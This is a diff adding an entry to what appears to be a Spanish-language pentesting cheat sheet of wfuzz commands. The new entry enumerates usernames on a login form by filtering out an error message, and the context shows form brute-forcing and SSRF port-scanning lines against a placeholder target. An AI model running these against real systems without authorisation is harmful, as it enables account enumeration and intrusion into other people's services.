@@ -50,6 +50,11 @@ wfuzz -c -H " User-Agent: Google Chrome" -t 400 --hc=404 -w /Directorio/de/Wordl
 wfuzz -c --h=429 -w /Directorio/de/Wordlist -d 'usuario=FUZZ&password=test' http://target/login.php
 ```
 
+#### Fuzzing en Formulario, no mostrando resultado con el mensaje de error al no encontrar el usuario
+```
+wfuzz -c --hs "No account found with that username." -w /Directorio/de/Wordlist -d 'usuario=FUZZ&password=test' http://target/login.php
+```
+
 #### Fuzzing SSRF
 ```
 wfuzz -c -z range,1-65535 -d 'formurl=http://localhost:FUZZ+-s&sumbit=Go' http://target/exposed.php
